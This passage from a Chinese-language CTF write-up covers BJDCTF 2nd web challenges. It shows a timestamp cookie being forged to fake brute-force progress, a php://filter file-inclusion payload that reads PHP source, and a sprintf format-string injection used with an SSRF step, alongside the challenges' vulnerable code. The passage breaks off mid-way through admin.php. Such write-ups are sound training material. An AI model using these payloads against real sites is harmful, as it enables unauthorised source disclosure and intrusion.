+  <li>还是思维僵化了，看到unserialize()就总想着反序列化漏洞。</li>
+  <li>然后对于XSS还是不熟悉。</li>
+</ol>
+
+<hr />
+
+<h1 id="schrodin">Schrodin</h1>
+
+<h2 id="题目描述-6">题目描述</h2>
+
+<p>一眼看到一大段文字：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11</pre></td><td class="code"><pre class="highlight"><code>You can give a wibsite to this page and this page will automatically identify various parameters of the target and try to burst the password.
+
+The longer the compute time is, the higher the success rate of the burst is.
+
+But before the final result is checked, no one knows whether to burst out the password. We call it the superposition state of burst and unburst
+
+You can check the progress at any time, but once you check the progress, this website will stop bursting and delete the relevant progress, which we call the collapse of the superposition state.
+
+If the CPU of the server is idle, it must be able to burst out the password you want very soon :)
+
+Enjoy it!
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>再下面是一个文本框和”Input”、”Check”两个按钮，然后显示了CPU利用率。</p>
+
+<h2 id="解题思路-6">解题思路</h2>
+
+<p>读一读，大致意思是它接受一个URL，然后可以爆破指定页面的密码。而在查看结果之前无法确定是否爆破成功，查看之后无论成功与否都会销毁相关信息。成功率受CPU利用率和爆破时间影响。</p>
+
+<p>然后没有思路，看看源码。源码中发现一个叫做test.php的文件，访问一下是个登录界面，傻乎乎地注了一波没什么结果。</p>
+
+<p>突然想起来是不是要用题目给的页面来对密码进行爆破，试一试，然而成功率很低：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3</pre></td><td class="code"><pre class="highlight"><code>Load of Server CPU98.65888129551892%
+Already burst 5 sec, 148102 p/s
+Forecast success rate 7.564358188440272%
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>失败了：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>Burst failed, maybe you should try longer.
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>下面就是应该想办法提高成功率了，注意到好像上面三个数据的变化都是不需要联网的，看看JS：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33<br/>34<br/>35<br/>36<br/>37<br/>38<br/>39<br/>40<br/>41<br/>42<br/>43<br/>44<br/>45<br/>46<br/>47<br/>48<br/>49<br/>50<br/>51<br/>52<br/>53<br/>54<br/>55<br/>56<br/>57<br/>58</pre></td><td class="code"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">_A</span><span class="p">(){</span>
+	<span class="kd">var</span> <span class="nx">num</span> <span class="o">=</span> <span class="mi">13</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">rate</span> <span class="o">=</span> <span class="mf">0.5</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+		<span class="kd">var</span> <span class="nx">symbol</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">&gt;</span> <span class="nx">rate</span> <span class="p">?</span> <span class="mi">1</span> <span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+		<span class="kd">var</span> <span class="nx">add_number</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">symbol</span> <span class="o">*</span> <span class="nx">c</span><span class="p">;</span>
+		<span class="k">if</span><span class="p">(</span><span class="nx">num</span> <span class="o">+</span> <span class="nx">add_number</span> <span class="o">&gt;</span> <span class="mi">100</span> <span class="o">||</span> <span class="nx">num</span> <span class="o">+</span> <span class="nx">add_number</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">){</span>
+		<span class="p">}</span>
+		<span class="k">else</span><span class="p">{</span>
+			<span class="nx">num</span> <span class="o">+=</span> <span class="nx">add_number</span><span class="p">;</span>
+			<span class="kd">var</span> <span class="nx">span1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'span1'</span><span class="p">);</span>
+			<span class="nx">span1</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">num</span> <span class="o">+</span> <span class="s1">'%'</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">_</span><span class="p">(){</span>
+	<span class="kd">var</span> <span class="nx">num</span> <span class="o">=</span> <span class="mi">13</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">rate</span> <span class="o">=</span> <span class="mf">0.2</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+		<span class="kd">var</span> <span class="nx">symbol</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">&gt;</span> <span class="nx">rate</span> <span class="p">?</span> <span class="mi">1</span> <span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+		<span class="kd">var</span> <span class="nx">add_number</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">symbol</span> <span class="o">*</span> <span class="nx">c</span><span class="p">;</span>
+		<span class="k">if</span><span class="p">(</span><span class="nx">num</span> <span class="o">+</span> <span class="nx">add_number</span> <span class="o">&gt;</span> <span class="mi">100</span> <span class="o">||</span> <span class="nx">num</span> <span class="o">+</span> <span class="nx">add_number</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">){</span>
+
+		<span class="p">}</span>
+		<span class="k">else</span><span class="p">{</span>
+			<span class="nx">num</span> <span class="o">+=</span> <span class="nx">add_number</span><span class="p">;</span>
+			<span class="kd">var</span> <span class="nx">span1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'span1'</span><span class="p">);</span>
+			<span class="nx">span1</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">num</span> <span class="o">+</span> <span class="s1">'%'</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">__</span><span class="p">(</span><span class="nx">sub</span><span class="p">){</span>
+	<span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">sub</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+		<span class="nx">s</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+		<span class="kd">var</span> <span class="nx">span2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'span2'</span><span class="p">);</span>
+		<span class="nx">span2</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">s</span><span class="p">;</span>
+	<span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">___</span><span class="p">(){</span>
+	<span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+		<span class="kd">var</span> <span class="nx">pwd</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="o">*</span> <span class="p">(</span><span class="mi">150000</span> <span class="o">-</span> <span class="mi">120000</span><span class="p">)</span> <span class="o">+</span> <span class="mi">120000</span><span class="p">);</span>
+		<span class="nx">span3</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">pwd</span><span class="p">;</span>
+	<span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">script</span><span class="p">(</span><span class="nx">sub</span><span class="p">){</span>
+	<span class="kd">var</span> <span class="nx">rate</span> <span class="o">=</span> <span class="nx">sub</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+		<span class="nx">rate</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+		<span class="nx">span4</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">rate</span><span class="p">)</span> <span class="o">*</span> <span class="mf">4.7</span><span class="p">;</span>
+	<span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>很明显CPU利用率完全是随机数，但是爆破时间函数接受了一个参数，抓包看看，HTML中的脚本是这样的：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">_</span><span class="p">();</span><span class="nx">__</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="nx">___</span><span class="p">();</span><span class="nx">script</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>两个函数的参数是一样的，来自服务器，然后线索又断了。</p>
+
+<p>继续抓包，看看Check的时候B/S是怎么通信的，注意到发送了两个Cookie，PHPSESSID和dXNlcg，后者一看就有问题，它的内容是”MTU4NTAxMzM2MQ%3D%3D”，base64解码一下，是”user”和”1585013361”。</p>
+
+<p>时间戳？确实，这么说来Check的时候是用时间戳来判断爆破时间的。那就改小一点试一下，成功了：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>Burst successed! The passwd is av11664517@1583985203.
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>一个B站视频号和一个时间戳，然后在视频的评论区找到flag。</p>
+
+<h2 id="备注-6">备注</h2>
+
+<ol>
+  <li>脑洞题，唯一的问题就是看到时间戳反应慢了。</li>
+</ol>
+
+<hr />
+
+<h1 id="elementmaster">elementmaster</h1>
+
+<h2 id="题目描述-7">题目描述</h2>
+
+<p>一幅漫画：</p>
+
+<p><img src="https://glyuan419.github.io/uploads/posts/2020-03-23-BJDCTF-2nd-Web/mendeleev.jpg" alt="mendeleev" /></p>
+
+<h2 id="解题思路-7">解题思路</h2>
+
+<p>在源码中看到两个隐藏标签，id后面跟着一串可疑的字符”506F2E”和”706870”，Hex解一下，是”Po.”和”php”，拼起来是个PHP文件，访问一下，返回只有一个字符”.”。</p>
+
+<p>漫画中提到了门捷列夫和118种元素，而Po也是一种元素，可以试着用Python跑一下每种元素的页面，所有返回拼成了一个新的文件”And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php”，访问获得flag。</p>
+
+<h2 id="备注-7">备注</h2>
+
+<ol>
+  <li>也是脑洞题，唯一的问题在于忽略了id后面的Hex字符。</li>
+</ol>
+
+<hr />
+
+<h1 id="文件探测">文件探测</h1>
+
+<h2 id="题目描述-8">题目描述</h2>
+
+<p>界面挺炫酷的，不过没什么用，然后在源码里发现一点信息：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code><span class="c">&lt;!-- Inheriting and carrying forward the traditional culture of the first BJDCTF, I left a hint in some place that you may neglect  --&gt;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<h2 id="解题思路-8">解题思路</h2>
+
+<p>Emmm，完全不记得上次BJD有什么传统，不过在响应头中找到一个了提示的文件名”home.php”，原来这是传统啊。</p>
+
+<p>访问一下，要求回答三个问题：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3</pre></td><td class="code"><pre class="highlight"><code>你知道目录下都有什么文件吗?
+请输入你想检测文件内容长度的url
+你希望以何种方式访问？GET？POST?
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>然后作为三个POST参数一起发出去，分别设为foo、bar、quz，返回如下：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2</pre></td><td class="code"><pre class="highlight"><code>~$ python fuck.py -u "bar.y1ng.txt" -M quz -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei
+       Error:  url invalid
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>没什么线索，不过注意到访问home.php时，URL被重定向为”home.php?file=system”，然后页面还提示了”现在访问的是 system.php”。文件包含吗？伪协议读一下源码：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code>home.php?file=php://filter/convert.base64-encode/resource=home
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>home.php源码删减：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33<br/>34<br/>35</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"y1ng"</span><span class="p">,</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="s1">'y1ng'</span><span class="p">)),</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">);</span>
+<span class="nb">setcookie</span><span class="p">(</span><span class="s1">'your_ip_address'</span><span class="p">,</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]),</span> <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\^|\~|&amp;|\|/"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"forbidden"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/.?f.?l.?a.?g.?/i"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"not now!"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/.?a.?d.?m.?i.?n.?/i"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"You! are! not! my! admin!"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^home$/i"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"禁止套娃"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">else</span><span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/home$/i"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])</span> <span class="k">or</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/system$/i"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
+            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span><span class="o">.</span><span class="s2">".php"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span><span class="p">{</span>
+            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span><span class="o">.</span><span class="s2">".fxxkyou!"</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="s2">"现在访问的是 "</span><span class="o">.</span><span class="nv">$file</span> <span class="o">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+        <span class="k">require</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"&lt;script&gt;location.href='./home.php?file=system'&lt;/script&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>system.php源码删减：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33<br/>34<br/>35<br/>36<br/>37<br/>38<br/>39<br/>40<br/>41<br/>42</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'y1ng'</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'y1ng'</span><span class="p">]</span> <span class="o">!==</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="s1">'y1ng'</span><span class="p">))){</span>
+    <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span><span class="p">;</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s2">"Refresh:0.1;url=index.php"</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$str2</span> <span class="o">=</span> <span class="s1">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ '</span><span class="p">;</span>
+<span class="nv">$str3</span> <span class="o">=</span> <span class="s1">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ '</span><span class="p">;</span>
+<span class="nv">$str4</span> <span class="o">=</span> <span class="s1">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ '</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+
+<span class="cp">&lt;?php</span>
+
+<span class="nv">$filter1</span> <span class="o">=</span> <span class="s1">'/^http:\/\/127\.0\.0\.1\//i'</span><span class="p">;</span>
+<span class="nv">$filter2</span> <span class="o">=</span> <span class="s1">'/.?f.?l.?a.?g.?/i'</span><span class="p">;</span>
+
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'q1'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'q2'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'q3'</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'q2'</span><span class="p">]</span><span class="o">.</span><span class="s2">".y1ng.txt"</span><span class="p">;</span>
+    <span class="nv">$method</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'q3'</span><span class="p">];</span>
+
+    <span class="nv">$str1</span> <span class="o">=</span> <span class="s2">"~$ python fuck.py -u </span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="nv">$url</span> <span class="o">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2"> -M </span><span class="nv">$method</span><span class="s2"> -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span><span class="p">;</span>
+
+    <span class="k">echo</span> <span class="nv">$str1</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$filter1</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)</span> <span class="p">){</span>
+        <span class="k">die</span><span class="p">(</span><span class="nv">$str2</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$filter2</span><span class="p">,</span> <span class="nv">$url</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="nv">$str3</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^GET/i'</span><span class="p">,</span> <span class="nv">$method</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^POST/i'</span><span class="p">,</span> <span class="nv">$method</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="nv">$str4</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nv">$detect</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+    <span class="k">print</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s2">"</span><span class="nv">$url</span><span class="s2"> method&amp;content_size:</span><span class="nv">$method</span><span class="s2">%d"</span><span class="p">,</span> <span class="nv">$detect</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>可以发现最后的sprintf()里将字符串匹配了”%d”，所以输出一直是0。不过因为字符串构造的问题，可以发生注入，将$method的值设为”GET%s%”即可。</p>
+
+<p>上面漏了一步，就是得知有admin.php这个文件，可以直接Scanner一把梭，或者推断一下，比如问”你知道目录下都有什么文件吗?”，而这个问题的答案并没有用到。</p>
+
+<p>admin.php的源码：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33<br/>34<br/>35<br/>36<br/>37<br/>38<br/>39<br/>40<br/>41<br/>42<br/>43<br/>44<br/>45<br/>46<br/>47<br/>48<br/>49<br/>50<br/>51<br/>52</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="nv">$f1ag</span> <span class="o">=</span> <span class="s1">'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'</span><span class="p">;</span> <span class="c1">//fake
+</span>
+<span class="k">function</span> <span class="nf">aesEn</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$method</span> <span class="o">=</span> <span class="s1">'AES-128-CBC'</span><span class="p">;</span>
+    <span class="nv">$iv</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">],</span><span class="kc">true</span><span class="p">);</span>
+    <span class="k">return</span>  <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">openssl_encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$method</span><span class="p">,</span><span class="nv">$key</span><span class="p">,</span> <span class="nx">OPENSSL_RAW_DATA</span> <span class="p">,</span> <span class="nv">$iv</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">Check</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'your_ip_address'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'your_ip_address'</span><span class="p">]</span> <span class="o">===</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'y1ng'</span><span class="p">]</span> <span class="o">===</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="s1">'y1ng'</span><span class="p">)))</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="k">else</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"127.0.0.1"</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
+<span class="p">}</span>
+
+
+<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'decrypt'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$decr</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'decrypt'</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">Check</span><span class="p">()){</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">];</span>
+        <span class="k">include</span> <span class="s1">'flag_2sln2ndln2klnlksnf.php'</span><span class="p">;</span>
